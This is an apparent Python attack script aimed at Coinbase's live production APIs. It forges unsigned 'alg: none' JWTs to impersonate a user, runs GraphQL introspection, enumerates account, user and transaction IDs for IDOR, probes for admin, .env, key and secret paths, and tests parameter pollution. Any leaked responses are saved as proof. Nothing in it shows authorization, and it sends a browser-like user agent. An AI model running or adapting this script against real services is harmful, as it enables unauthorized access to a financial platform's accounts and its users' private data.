#!/usr/bin/env python3
"""
Coinbase Deep Security Testing
- JWT signature bypass (alg: none)
- API endpoint fuzzing
- GraphQL introspection
- IDOR testing
"""

import requests
import json
import base64
from urllib.parse import urljoin

class CoinbaseSecurityTest:
    def __init__(self):
        self.base_urls = {
            'api': 'https://api.coinbase.com',
            'exchange': 'https://api.exchange.coinbase.com',
            'login': 'https://login.coinbase.com',
            'accounts': 'https://accounts.coinbase.com'
        }
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
        })
        self.findings = []

    def test_jwt_none_alg(self):
        """Test JWT alg:none vulnerability"""
        print("\n[+] Testing JWT 'none' algorithm bypass...")

        # Create JWT with alg:none
        header = {"alg": "none", "typ": "JWT"}
        payload = {
            "sub": "test@coinbase.com",
            "iat": 1722700000,
            "exp": 9999999999,
            "scope": "wallet:user:read wallet:addresses:read"
        }

        # Encode without signature
        header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
        payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')

        # JWT with empty signature
        jwt_none = f"{header_b64}.{payload_b64}."

        # Test against userinfo endpoint
        endpoints = [
            '/oauth/userinfo',
            '/api/v3/brokerage/accounts',
            '/api/v2/user',
            '/v2/user'
        ]

        for endpoint in endpoints:
            for base_name, base_url in self.base_urls.items():
                url = urljoin(base_url, endpoint)
                try:
                    resp = self.session.get(url, headers={'Authorization': f'Bearer {jwt_none}'}, timeout=10)
                    print(f"  [{resp.status_code}] {url}")
                    if resp.status_code == 200 and 'error' not in resp.text.lower():
                        self.findings.append({
                            'severity': 'CRITICAL',
                            'type': 'JWT None Algorithm Bypass',
                            'url': url,
                            'proof': f"Status: {resp.status_code}, Response: {resp.text[:200]}"
                        })
                        print(f"    ⚠️  CRITICAL: JWT none alg accepted!")
                except Exception as e:
                    pass

    def test_graphql_introspection(self):
        """Test GraphQL introspection and mutations"""
        print("\n[+] Testing GraphQL endpoints...")

        graphql_urls = [
            'https://exchange.coinbase.com/graphql',
            'https://api.coinbase.com/graphql',
            'https://accounts.coinbase.com/graphql'
        ]

        introspection_query = {
            "query": """
            {
                __schema {
                    types {
                        name
                        fields {
                            name
                        }
                    }
                    mutationType {
                        name
                        fields {
                            name
                            args {
                                name
                                type {
                                    name
                                }
                            }
                        }
                    }
                }
            }
            """
        }

        for url in graphql_urls:
            try:
                resp = self.session.post(url, json=introspection_query, timeout=10)
                print(f"  [{resp.status_code}] {url}")

                if resp.status_code == 200:
                    data = resp.json()
                    if 'data' in data and '__schema' in data['data']:
                        print(f"    ⚠️  GraphQL introspection enabled!")

                        # Look for sensitive mutations
                        if 'mutationType' in data['data']['__schema']:
                            mutations = data['data']['__schema']['mutationType']
                            if mutations:
                                print(f"    Found mutations: {mutations}")
                                self.findings.append({
                                    'severity': 'HIGH',
                                    'type': 'GraphQL Introspection Enabled',
                                    'url': url,
                                    'proof': json.dumps(mutations)[:500]
                                })
            except Exception as e:
                pass

    def test_api_idor(self):
        """Test IDOR vulnerabilities in API endpoints"""
        print("\n[+] Testing IDOR vulnerabilities...")

        # Test numeric ID enumeration
        test_ids = ['1', '100', '999', 'me', 'admin', '../admin']

        idor_endpoints = [
            '/v2/accounts/{id}',
            '/v2/users/{id}',
            '/api/v3/brokerage/accounts/{id}',
            '/api/v1/users/{id}/profile',
            '/api/profile/{id}',
            '/api/v1/accounts/{id}/transactions'
        ]

        for endpoint_template in idor_endpoints:
            for test_id in test_ids:
                endpoint = endpoint_template.replace('{id}', test_id)

                for base_name, base_url in self.base_urls.items():
                    url = urljoin(base_url, endpoint)
                    try:
                        resp = self.session.get(url, timeout=10)

                        if resp.status_code == 200 and len(resp.text) > 100:
                            print(f"  [200] {url}")
                            print(f"    ⚠️  Possible IDOR: {resp.text[:150]}")

                            # Check for sensitive data
                            if any(keyword in resp.text.lower() for keyword in
                                   ['email', 'balance', 'wallet', 'address', 'private']):
                                self.findings.append({
                                    'severity': 'HIGH',
                                    'type': 'IDOR - Unauthorized Data Access',
                                    'url': url,
                                    'proof': f"ID: {test_id}, Response: {resp.text[:200]}"
                                })
                    except Exception:
                        pass

    def test_api_fuzzing(self):
        """Fuzz API endpoints for hidden functionality"""
        print("\n[+] Fuzzing API endpoints...")

        # Common sensitive endpoints
        sensitive_paths = [
            '/admin',
            '/internal',
            '/debug',
            '/test',
            '/api/admin',
            '/api/internal/users',
            '/api/v1/admin/accounts',
            '/api/v2/admin/transactions',
            '/v2/internal/config',
            '/.env',
            '/config',
            '/swagger.json',
            '/api-docs',
            '/graphql/console',
            '/api/v1/keys',
            '/api/v1/secrets',
            '/api/webhooks',
            '/api/v1/admin/webhooks'
        ]

        for path in sensitive_paths:
            for base_name, base_url in self.base_urls.items():
                url = urljoin(base_url, path)
                try:
                    resp = self.session.get(url, timeout=10)

                    # 200/403 with content = interesting
                    if resp.status_code in [200, 403] and len(resp.text) > 50:
                        print(f"  [{resp.status_code}] {url} ({len(resp.text)} bytes)")

                        if resp.status_code == 200:
                            self.findings.append({
                                'severity': 'MEDIUM',
                                'type': 'Exposed Sensitive Endpoint',
                                'url': url,
                                'proof': f"Response: {resp.text[:200]}"
                            })
                except Exception:
                    pass

    def test_parameter_pollution(self):
        """Test HTTP Parameter Pollution"""
        print("\n[+] Testing parameter pollution...")

        test_url = "https://api.coinbase.com/v2/exchange-rates"

        # HPP payloads
        payloads = [
            {'currency': 'USD', 'currency': 'BTC'},  # Duplicate param
            {'currency': 'USD&currency=admin'},       # Encoded injection
            {'currency': 'USD%26admin=true'}          # Double encoded
        ]

        baseline = self.session.get(test_url, params={'currency': 'USD'}, timeout=10)
        baseline_len = len(baseline.text)

        for payload in payloads:
            try:
                resp = self.session.get(test_url, params=payload, timeout=10)
                if abs(len(resp.text) - baseline_len) > 100:
                    print(f"  ⚠️  Response size diff: {len(resp.text)} vs {baseline_len}")
                    self.findings.append({
                        'severity': 'MEDIUM',
                        'type': 'HTTP Parameter Pollution',
                        'url': test_url,
                        'proof': f"Payload: {payload}, Response diff: {len(resp.text) - baseline_len}"
                    })
            except Exception:
                pass

    def run_all_tests(self):
        """Run all security tests"""
        print("=" * 60)
        print("Coinbase Deep Security Testing")
        print("=" * 60)

        self.test_jwt_none_alg()
        self.test_graphql_introspection()
        self.test_api_idor()
        self.test_api_fuzzing()
        self.test_parameter_pollution()

        # Print summary
        print("\n" + "=" * 60)
        print("FINDINGS SUMMARY")
        print("=" * 60)

        if not self.findings:
            print("No critical vulnerabilities found.")
        else:
            critical = [f for f in self.findings if f['severity'] == 'CRITICAL']
            high = [f for f in self.findings if f['severity'] == 'HIGH']
            medium = [f for f in self.findings if f['severity'] == 'MEDIUM']

            print(f"\n🔴 CRITICAL: {len(critical)}")
            for f in critical:
                print(f"  - {f['type']}: {f['url']}")
                print(f"    Proof: {f['proof'][:100]}...")

            print(f"\n🟠 HIGH: {len(high)}")
            for f in high:
                print(f"  - {f['type']}: {f['url']}")
                print(f"    Proof: {f['proof'][:100]}...")

            print(f"\n🟡 MEDIUM: {len(medium)}")
            for f in medium:
                print(f"  - {f['type']}: {f['url']}")

        # Save results
        with open('coinbase_findings.json', 'w') as f:
            json.dump(self.findings, f, indent=2)
        print(f"\n✓ Results saved to coinbase_findings.json")

if __name__ == '__main__':
    tester = CoinbaseSecurityTest()
    tester.run_all_tests()
